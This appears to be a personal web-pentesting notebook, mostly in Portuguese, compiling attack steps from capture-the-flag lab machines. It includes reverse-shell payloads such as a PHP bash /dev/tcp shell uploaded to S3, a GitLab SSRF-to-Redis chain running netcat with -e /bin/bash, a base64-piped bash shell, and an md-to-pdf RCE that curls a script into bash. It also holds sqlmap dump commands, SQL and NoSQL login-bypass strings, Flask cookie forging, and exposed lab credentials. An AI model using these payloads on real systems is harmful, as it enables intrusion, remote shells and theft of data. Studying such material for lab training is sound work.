# HTTP

`GET /browse.php?file=php://filter/convert.base64-encode/resource=ini.php`

- Enum
    
    ```bash
    whatweb 10.0.29.163
    
    http 10.0.29.163
    
    dirb http://10.0.29.163
    
    nmap --script http-enum -sV -p 80 10.0.28.146 --directoties
    
    nmap --script http-headers -sV -p 80 10.0.28.146 --IIS Server,ASP.NET,XSS Protection version
    
    nmap --script http-methods --script-args http-methods.url-path=/webdav/
    10.0.28.146
    
    nmap --script http-webdav-scan --script-args http-methods.url-path=/webdav/
    10.0.28.146
    
    nmap -sV -script banner 192.30.247.3
    
    Metasploit
    msfconsole
    use auxiliary/scanner/http/http_version
    set RHOSTS 192.30.247.3
    exploit
    
    use auxiliary/scanner/http/brute_dirs
    set RHOSTS 192.30.247.3
    exploit
    
    use auxiliary/scanner/http/robots_txt
    set RHOSTS 192.30.247.3
    run
    
    curl http://192.30.247.3/
    
    wget “http://192.30.247.3/index”
    
    browsh --startup-url 192.30.247.3
    
    lynx http://192.30.247.3
    
    dirb http://192.30.247.3
    /usr/share/metasploit-framework/data/wordlists/directory.txt
    
    ```
    
- AWS
    
    Enum
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled.png)
    
    O site 
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%201.png)
    
    Este domínio está hospedando uma aplicação de plataforma de publicidade, mas as imagens da aplicação não carregam. Vamos visualizar o código-fonte da página.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%202.png)
    
    As imagens da aplicação estão sendo carregadas a partir da pasta adserver de um subdomínio de bucket.htb. Vamos adicionar isso também ao nosso arquivo hosts.
    
    Foothold
    
    `curl http://s3.bucket.htb/ | jq`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%203.png)
    
    Retorna um objeto JSON com o status de execução. Isso parece uma resposta genérica da API e podemos verificar os cabeçalhos de resposta.
    
    `curl -v http://s3.bucket.htb/ | jq`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%204.png)
    
    Isso revela alguns cabeçalhos interessantes. Vamos pesquisar online pelo cabeçalho x-amz-version-id.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%205.png)
    
    S3
    
    Vemos que este cabeçalho está relacionado ao AWS Simple Storage Service (S3). É um serviço de armazenamento de objetos usado especificamente para armazenar arquivos estáticos para um site ou para ter outros documentos.
    
    O formato de URL para serviços S3 em geral é o seguinte:
    
    `https://[bucketname].s3.domainname.com`
    `https://s3-[region].domainname.com/[bucketname]`
    
    Com esse conhecimento, agora sabemos que o caminho da pasta adserver é um nome de bucket. Podemos usar a ferramenta de linha de comando aws para enumerar os arquivos e pastas dentro de um bucket S3. Vamos instalar a ferramenta emitindo o seguinte comando.
    
    Por padrão, a ferramenta AWS CLI interage com [s3.amazonaws.com](http://s3.amazonaws.com/). Como temos outro domínio hospedando-o, podemos usar a opção --endpoint-url para apontar a ferramenta para outro domínio.
    
    `aws --endpoint-url=http://s3.bucket.htb s3 ls`
    
    A ferramenta AWS CLI procura pelo arquivo ~/.aws/credentials para localizar as chaves a fim de autenticar-se nos serviços na nuvem. Infelizmente, não temos chaves válidas para autenticar com o serviço. Como se trata de uma implementação personalizada dos serviços da AWS, podemos usar qualquer credencial aleatória para autenticação. Vamos configurar as chaves.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%206.png)
    
    `aws --endpoint-url=http://s3.bucket.htb s3 ls`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%207.png)
    
    Encontramos que o bucket adserver está presente. Vamos listar todo o conteúdo dentro deste bucket.
    
    `aws --endpoint-url=http://s3.bucket.htb s3 ls s3://adserver`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%208.png)
    
    É possível baixar os arquivos emitindo o seguinte comando.
    
    `aws --endpoint-url=http://s3.bucket.htb s3 sync s3://adserver .`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%209.png)
    
    Ao examinar o conteúdo do arquivo index.html, descobrimos que esses arquivos são servidos pelo servidor Apache. Podemos enviar um arquivo PHP de exemplo para o bucket S3 para testar se o PHP está de fato instalado.
    
    `echo '<?php phpinfo();?>' > test.php`
    `aws --endpoint-url=http://s3.bucket.htb s3 cp test.php s3://adserver`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2010.png)
    
    Também notamos que o PHP está instalado no servidor Apache. Podemos executar os seguintes comandos para enviar outro arquivo PHP com código que pode retornar um shell reverso.
    
    `echo "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.14.3/4444 0>&1 \"');
    ?>" > shell.php`
    `aws --endpoint-url=http://s3.bucket.htb s3 cp shell.php s3://adserver/`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2011.png)
    
    Vamos iniciar um ouvinte na porta 4444 e navegar até [http://bucket.htb/shell.php](http://bucket.htb/shell.php).
    
- GitLab
    
    Site gitLab Portas
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2012.png)
    
    Duas portas abertas `22` e `5080`.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2013.png)
    
    Fazemos o registo para poder aceder ao gitlab.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2014.png)
    
    Ao navegar para Projetos -> Explorar projetos -> Alternar para "Todos" -> dude / ready-channel, revela o código-fonte do Drupal CMS.
    No canto superior direito da página da web, podemos encontrar o link de ajuda, que revela a versão do Gitlab.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2015.png)
    
    Vemos que a versão do GitLab é `11.4.7`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2016.png)
    
    Pesquisando no Google, vemos que exist um RCE neste codigo.
    
    Existem várias vulnerabilidades para o Gitlab, mas vamos nos concentrar em uma maneira de explorar uma combinação de vulnerabilidades SSRF (CVE-2018-19571) e CRLF (CVE-2018-19585). De acordo com o GitLab Security Release, ambas as vulnerabilidades estão ocorrendo nesta versão do GitLab. A vulnerabilidade SSRF está na versão específica do Redis. Vamos acionar SSRF importando um novo repositório por URL. Primeiro, criamos um novo projeto
    
    [https://github.com/jas502n/gitlab-SSRF-redis-RCE](https://github.com/jas502n/gitlab-SSRF-redis-RCE)
    
    Temos a ferramenta Burp já aberta e configurada para que nosso navegador da web possa encaminhar o tráfego para a porta 8080, na qual o Burp está ouvindo.
    
    Selecionamos "Importar projeto" e depois "Repositório por URL", conforme mostrado na imagem a seguir. Colocamos alguns valores aleatórios nos campos obrigatórios e, em seguida, enviamos a solicitação. Definimos os campos "URL do repositório Git", "Nome do projeto" e "Slug do projeto" como "test" e selecionamos "Criar projeto".
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2017.png)
    
    Escolhemos importar
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2018.png)
    
    Depois escolher a opção `RepobyURL`
    
    Intersectar o pedido com o `BurpSuite`
    
    No site on tem o RCE vemos que tem varias linhas de código que impedem comunicar com o localhost
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2019.png)
    
    ```
    POST /projects HTTP/1.1
    Host: 10.129.227.132:5080
    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://10.129.227.132:5080/projects/new
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 412
    Origin: http://10.129.227.132:5080
    DNT: 1
    Connection: close
    Cookie: _gitlab_session=c3beb8a82d096bca38f1f54ca5213045; sidebar_collapsed=false; event_filter=all
    Upgrade-Insecure-Requests: 1
    Sec-GPC: 1
    
    utf8=%E2%9C%93&authenticity_token=35OyNcHtKzM6IEQ8qADc6NwcAm5Th396BH0Xgke5%2BrQ2Dba5pgVbDS2HO%2Fkh5eKAQqlc0f0pzHFqF%2B3RHCugIA%3D%3D&project%5Bimport_url%5D=git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A0.0.0.0%5D%3A6379%2Ffoo%2Ffoo.git%2Ftest%2Ftest.git&project%5Bci_cd_only%5D=false&project%5Bname%5D=rce5&project%5Bnamespace_id%5D=6&project%5Bpath%5D=rce5&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0
    ```
    
    O protocolo de comunicação do Redis permite enviar dados em ASCII. Isso significa que podemos enviar esta solicitação HTTP POST diretamente para o servidor Redis. Para fazer isso, temos que adicionar a porta na qual o Redis está sendo executado, que é a porta 6379. Em seguida, vamos adicionar o payload encontrado anteriormente no repositório do GitHub.
    
    ```
     multi
     sadd resque:gitlab:queues system_hook_push
     lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":
    [\"class_eval\",\"open(\'| nc 10.10.14.3 4444 -e
    /bin/bash\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc564117
    3e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
     exec
     exec
     exec
     exec
    ```
    
    O código deve ser colocado entre o final do URLque foi colocado, neste caso `git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test`, e o sinal `&`.
    
    ```
    utf8=%E2%9C%93&authenticity_token=5pZx%2BJP2zd3cVS6E3P0H2gfjZg3qtuvcQnXkhw0V7ePuYk7B5k4
    %2Bm7PSGrGs1FdRPsLLs3zSgq1c5Eb2JHlCpQ%3D%3D&project%5Bimport_url%5D=git://[0:0:0:0:0:ff
    ff:127.0.0.1]:6379/test
     multi
     sadd resque:gitlab:queues system_hook_push
     lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":
    [\"class_eval\",\"open(\'| nc 10.10.14.3 4444 -e
    /bin/bash\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc564117
    3e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
     exec
     exec
     exec
     exec
    &project%5Bci_cd_only%5D=false&project%5Bname%5D=test1&project%5Bnamespace_id%5D=4&proj
    ect%5Bpath%5D=test1&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0
    ```
    
    `echo -n YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzMvMTIzNCAgMD4mMSc= | base64 -d | bash` 
    
    Nota importante: Ao gerar o código em base64, deve se ter em atenção, não deixar nenhum caracter especial, exemplo `+` , para tentar tirar isto, é necessário acrescentar espaços entre os argumentos do comando. Não esquecer no final dar um espaço. 
    
- SVNserve
    
    Nmap
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2020.png)
    
    Encontramos 3 portos abertos. 80-http, 3690-svnserve e 5985-http.
    
    Site normal 
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2021.png)
    
    Pesquisando no hacktricks vemos que comandos usar para extrair dados do servidor.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2022.png)
    
    Com o checkout conseguimos extrair os dados que vemos acima.
    
    `svn checkout svn://10.10.10.203` 
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2023.png)
    
    Vemos que temos um novo domino `dimension.worker.htb` 
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2024.png)
    
    Vemos que temos um novo domino `devops.worker.htb` 
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2025.png)
    
    `curl -s http://dimension.worker.htb/#work | grep -oh 'http://.*worker.htb'`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2026.png)
    
    O segundo commit (r2) parece interessante. Podemos usar `svn update -r 2` para trazer as alterações do repositório para o nosso diretório de trabalho. Os números de revisão (r) são incrementados a cada novo commit no repositório.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2027.png)
    
    Pela saída do comando acima, vemos que neste commit um arquivo chamado moved.txt foi excluído e um arquivo chamado deploy.ps1 foi adicionado. A inspeção de deploy.ps1 revela credenciais para o usuário nathen. 
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2028.png)
    
    Essas credenciais não funcionam para WinRM, então podemos procurar por qualquer tipo de funcionalidade de login nos subdomínios. O subdomínio devops.worker.htb está configurado para usar autenticação básica.
    
    Após visitar o site devops.worker.htb com um navegador e podemos fazer login com sucesso com as credenciais nathen / wendel98. Estamos apresentados com uma interface do Azure DevOps. Também podemos ver que temos acesso a um projeto chamado SmartHotel360.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2029.png)
    
- SQL Injection
    
    Cookie
    
    `sqlmap -u "[https://checkout.shared.htb/](https://checkout.shared.htb/)" --cookie='custom_cart={"*":"1"}' --flush -- fresh-queries --level=3 --risk=3`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2030.png)
    
    `sqlmap -u "[https://checkout.shared.htb/](https://checkout.shared.htb/)" --cookie='custom_cart={"*":"1"}' --level=3 --risk=3 --fresh-queries --dbs`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2031.png)
    
    `sqlmap -u "[https://checkout.shared.htb/](https://checkout.shared.htb/)" --cookie='custom_cart={"*":"1"}' --level=3 --risk=3 --fresh-queries -D checkout --tables`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2032.png)
    
    `sqlmap -u "[https://checkout.shared.htb/](https://checkout.shared.htb/)" --cookie='custom_cart={"*":"1"}' --level=3 --risk=3 --fresh-queries -D checkout -T user --dump`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2033.png)
    
    Email
    
    ```bash
    admin' or 1 = 1 -- -
    sqlmap -r goodgames.req
    ```
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2034.png)
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2035.png)
    
    ```bash
    Guardar a Request num ficheiro
    sqlmap -r goodgames.req
    sqlmap -r goodgames.req --dbs --Identifica as Bases de dados
    sqlmap -r goodgames.req -D main --tables -- Identifica as tabelas
    sqlmap -r goodgames.req -D main -T user --dump -- Faz o dump da tabela user
    
    ```
    
    # **Common Injections for Login Forms:**
    
    - `admin' --`
    - `admin' #`
    - `admin'/*`
    - `' or 1=1--`
    - `' or 1=1#`
    - `' or 1=1/*`
    - `') or '1'='1--`
    - `') or ('1'='1—`
    
    # **SQLMap**
    
    - `sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3`
        - Automated sqlmap scan
    - `sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3`
    - `sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php"`
        - Targeted sqlmap scan
    - `sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump` Scan url for union + error based injection with mysql backend and use a random user agent + database dump
    - `sqlmap -o -u "http://meh.com/form/" –forms`
        - sqlmap check form for injection
    - `sqlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users –dump`
        - sqlmap dump and crack hashes for table users on database-name.
    - `sqlmap --flush session`
        - Flushes the session
    - `sqlmap -p user --technique=B`
        - Attempts to exploit the “user” field using boolean technique.
    - `sqlmap -r <captured request>`
        - Capture a request via Burp Suite, save it to a file, and use this command to let sqlmap automate everything. Add –os-shell at the end to pop a shell if possible.
- MangoDB
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2036.png)
    
    O website tem login
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2037.png)
    
    Ao tentar fazer login usando credenciais padrão comuns, a tentativa falha. Vamos interceptar a solicitação no Burp e examinar a solicitação de login.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2038.png)
    
    Ao injetar aspas, não recebemos um erro ou uma mudança na resposta. Como o site está sendo executado em PHP, podemos tentar contornar a autenticação usando a manipulação de tipos. Isso pode ser feito adicionando [] aos parâmetros da solicitação, o que faz com que o PHP os use como uma matriz. Isso irá contornar a autenticação se houver algum tipo de comparação fraca em vigor.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2039.png)
    
    Como é uma base de dados NoSQL colocamos os `$ne` antes do igual 
    
    ```
    POST / HTTP/1.1
    Host: staging-order.mango.htb
    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 51
    Origin: http://staging-order.mango.htb
    DNT: 1
    Connection: close
    Referer: http://staging-order.mango.htb/
    Cookie: PHPSESSID=2iam3rlq1fbaajte968f1el9nd
    Upgrade-Insecure-Requests: 1
    Sec-GPC: 1
    
    username[$ne]=admin&password[$ne]=admin&login=login
    ```
    
    Como a página inicial não retorna informações úteis, podemos tentar exfiltrar dados do banco de dados Mongo usando o operador $regex. O operador $regex pode ser usado para encontrar dados usando expressões regulares. Por exemplo, a seguinte consulta procurará por nomes de usuário que correspondam à regex a.*, que corresponde a qualquer nome de usuário que contenha um a.
    
    ```
    Host: staging-order.mango.htb
    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 41
    Origin: http://staging-order.mango.htb
    DNT: 1
    Connection: close
    Referer: http://staging-order.mango.htb/
    Cookie: PHPSESSID=2iam3rlq1fbaajte968f1el9nd
    Upgrade-Insecure-Requests: 1
    Sec-GPC: 1
    
    username[$regex]=^admin&password[$ne]=^t9KcS3>!0B#2§admin§&login=login
    ```
    
    Podemos utilizar o intruder para descobrir os username, e de cada vez que existir um caractere que retorne o status 302, coloca se novamente no 
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2040.png)
    
    ```
    POST / HTTP/1.1
    Host: staging-order.mango.htb
    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 41
    Origin: http://staging-order.mango.htb
    DNT: 1
    Connection: close
    Referer: http://staging-order.mango.htb/
    Cookie: PHPSESSID=2iam3rlq1fbaajte968f1el9nd
    Upgrade-Insecure-Requests: 1
    Sec-GPC: 1
    
    username=admin&password[$regex]=^t9KcS3>!0B#§admin§&login=login
    ```
    
    `username=admin&password[$regex]=^t9KcS3>!0B#§admin§&login=login`
    
- Flask-coockie
    
    Site com login e registo
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2041.png)
    
    É possível enumerar o utilizadores 
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2042.png)
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2043.png)
    
    `ffuf -u http://10.129.19.246:5000/login -d 'username=FUZZ&password=paulo' -H 'Content-Type: application/x-www-form-urlencoded' -w /opt/useful/SecLists/Usernames/xato-net-10-million-usernames.txt -mr 'Invalid login'`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2044.png)
    
    Quando entramos com o utilizador criado é nos fornecida uma coockie
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2045.png)
    
    O valor do cookie de sessão parece estar no formato dos cookies de sessão do Flask. Podemos usar este site para decodificar os dados do cookie a fim de ver os parâmetros que estão sendo definidos.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2046.png)
    
    [Baking Flask cookies with your secrets](https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce?gi=e3ee3b9c94ab)
    
    O Flask, por padrão, utiliza "cookies assinados", que é uma forma de armazenar os dados da sessão atual no cliente (em vez do servidor) de tal forma que não possam ser adulterados. O ponto chave a ser observado aqui é que os cookies não são criptografados, eles são assinados. Isso significa que o conteúdo da sessão pode ser lido sem a chave secreta.
    
    No caso da assinatura, os dados são assinados através da criação de um hash da mensagem com um algoritmo de hash e a chave secreta do remetente. Isso produz um resumo de hash, que só pode ser recriado através do uso da chave secreta.
    
    Este post de blog analisa como funciona a gestão de sessões do Flask e como podemos contornar a autenticação por força bruta na chave secreta do cookie de sessão.
    
    Podemos fazer uso de um pacote Python conhecido como "flask-unsign", que é uma ferramenta de linha de comando para decodificar o cookie e fazer força bruta na chave secreta para criar cookies de sessão personalizados do Flask. Ele pode ser instalado usando o seguinte comando. Este comando também instala uma lista de palavras contendo chaves secretas comuns, e por padrão, o "flask-unsign" usará esta lista se não especificarmos uma por conta própria.
    
    [Flask - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask)
    
    `flask-unsign --unsign --cookie 'SESSION_COOKIE_VALUE’`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2047.png)
    
    A chave secreta obtida é secret123. Agora, precisamos encontrar um nome de usuário válido para roubar a sessão. Vamos usar esta lista de palavras de usuário do SecLists. Podemos usar o seguinte script Python, que percorre cada entrada na lista de palavras de usuário e gera um cookie para cada nome de usuário usando a utilidade flask-unsign.
    
    Como sabemos que existe um utilizador chamado blue, e como temos o secret, forjamos a cookie
    
    `flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue' }" --secret 'secret123’`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2048.png)
    
    Pegamos na cookie e colamos no website e obtemos um conjunto de funcionalidades novas
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2049.png)
    
    Agora podemos ver o painel do usuário blue e parece que este usuário já é um membro VIP, pois não vemos um botão para "Atualizar para VIP". Em vez disso, vemos dois botões adicionais, "Importar Notas" e "Exportar Notas".
    
    Se navegarmos para a seção "Notas" a partir da barra de navegação superior do site, podemos ver duas notas salvas.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2050.png)
    
    Após ler ambas as notas, vemos que uma delas contém a senha FTP para o usuário blue. Além disso, também podemos observar que esta nota foi escrita pelo usuário ftp_admin.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2051.png)
    
    ```
    FTP credentials
    user : blue
    password : blue@Noter!
    ```
    
    Vamos tentar conectar ao serviço FTP usando as credenciais fornecidas.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2052.png)
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2053.png)
    
    `get policy.pdf`
    
    Ao abrir o arquivo policy.pdf em um visualizador de PDF, vemos que ele fornece informações sobre a política de senhas da empresa. Na seção "Criação de Senhas", há informações sobre o formato da senha padrão que é gerada pelo aplicativo.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2054.png)
    
    Olhando para o nome de usuário do usuário blue, podemos ver que sua senha "blue@Noter!" se encaixa no formato mencionado.
    
    Refletindo sobre a nota que encontramos, escrita pelo usuário ftp_admin, e assumindo que a senha ainda não foi alterada e está definida como padrão, podemos deduzir que a senha possível do usuário ftp_admin é "ftp_admin@Noter!". Vamos tentar fazer login no serviço FTP usando essas credenciais.
    
    ```
    user : ftp_admin
    password. : ftp_admin@Noter!
    ftp ftp_admin@10.10.11.160
    ```
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2055.png)
    
    Ao listar os arquivos no diretório, encontramos dois arquivos zip que parecem ser backups do aplicativo. Vamos baixar esses arquivos para nossa máquina local usando o comando "get".
    
    ```
    get app_backup_1635803546.zip
    get app_backup_1638395546.zip
    ```
    
    ## MD to pdf
    
    Dentro dos ficheiros vemos que contem credenciais para o mysql
    
    ```
    [** SNIP **]
    app = Flask(__name__)
    # Config MySQL
    app.config['MYSQL_HOST'] = 'localhost'
    app.config['MYSQL_USER'] = 'root'
    app.config['MYSQL_PASSWORD'] = 'Nildogg36'
    app.config['MYSQL_DB'] = 'app'
    app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
    [** SNIP **]
    ```
    
    A fazer um `diff -r y 'primeira dir' 'segunda dir'` encontramos uma função de exportar
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2056.png)
    
    Está usando o arquivo md-to-pdf.js no diretório misc. Após ler o conteúdo do arquivo md-to-pdf.js, podemos ver que ele está usando um pacote Node chamado md-to-pdf.
    
    ```
    cat misc/md-to-pdf.js
    ```
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2057.png)
    
    `cat misc/package-lock.json | grep -B 3 md-to-pdf`
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2058.png)
    
    Ao fazer uma rápida pesquisa no Google com as palavras-chave "md-to-pdf 4.1.0 exploit", descobrimos que esta versão é vulnerável a uma vulnerabilidade de Execução Remota de Código. A prova de conceito (PoC) desse exploit pode ser encontrada aqui. Precisamos fazer o pacote md-to-pdf analisar a seguinte carga útil para executar o código de RCE.
    
    ```
    ---js\n((require("child_process")).execSync("<RCE_code>"))\n---RCE
    ```
    
    Ao analisar novamente o arquivo `app.py`, percebemos que o aplicativo verifica se o arquivo referenciado termina com a extensão .md.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2059.png)
    
    Assim, devemos renomear nosso arquivo de payload para ter a extensão de arquivo .md. Primeiro, vamos enviar o seguinte payload de teste que acionará uma solicitação GET do host remoto para nosso servidor web para o arquivo test.txt. Salve o payload no arquivo [rce.md](http://rce.md/) usando o seguinte comando:
    
    `echo "---js\\\n((require(\"child_process\")).execSync(\"curl
    YOUR_IP_ADDRESS:8000/test.txt\"))\\\n---RCE" > rce.md`
    
    Vamos iniciar um servidor web Python em nossa máquina local na porta 8000 no diretório que contém o arquivo rce.md.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2060.png)
    
    Após clicar no botão "Exportar", podemos ver que nosso servidor web recebe uma solicitação GET para o arquivo [rce.md](http://rce.md/) e, após alguns segundos, outra solicitação GET para o arquivo /test.txt é registrada. Isso confirma uma execução remota de código bem-sucedida.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2061.png)
    
    `Test.md` file
    
    ```
    ---js\n((require("child_process")).execSync("curl 10.10.14.190:8000/RCE | bash"))\n---RCE
    ```
    
    `RCE` file
    
    ```
    bash -c 'bash -i >& /dev/tcp/10.10.14.190/1234 0>&1'
    ```
    
    Iniciar o listener
    
- Coockie Snipper
    
    Ao tentar criar o utilizador admin, não é permitido, quer dizer que existe esse utilizador
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2062.png)
    
    Utilizando o sqlmap no register e login não detectou nenhum injeção SQL, é possivel criar novo utilizadores 
    
    Ao criar uma nova conta vimos que a coockie era gerada automaticamente, e de forma aleatória
    
    ```
    GET /index.php HTTP/1.1
    Host: 10.129.18.175
    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://10.129.18.175/register.php
    DNT: 1
    Connection: close
    Cookie: auth=uEFgmsjNgcnOiFu59%2FswQkOlocBJaMUt
    Upgrade-Insecure-Requests: 1
    Sec-GPC: 1
    ```
    
    Vamos tentar uma abordagem que consiste em trocar um caractere ao criar na cookie, por exemplo, criar um utilizador cdmin, e depois colocar no intruder, com o ataque sniper,  para trocar um caractere no utilizador. O que se pretende é que ele mude uma letra na cookie, de cdmin para admin, fazendo com que a cookie seja valida. 
    
    Primeiro, vamos criar um utilizador cdmin
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2063.png)
    
    Depois de criar, atualizamos a pagina e colocamos no Burp Suite.
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2064.png)
    
    Estas são as opções a colocar
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2065.png)
    
    Depois procuramos a resposta que tenha admin
    
    ![Untitled](HTTP%204645d23f7f8d4ee4966b0de67574e568/Untitled%2066.png)
    
- http
    
    ```
    <?php
    require('config.php');
    
    if (!($_SESSION['Authenticated'])) {
      echo "Access Denied";
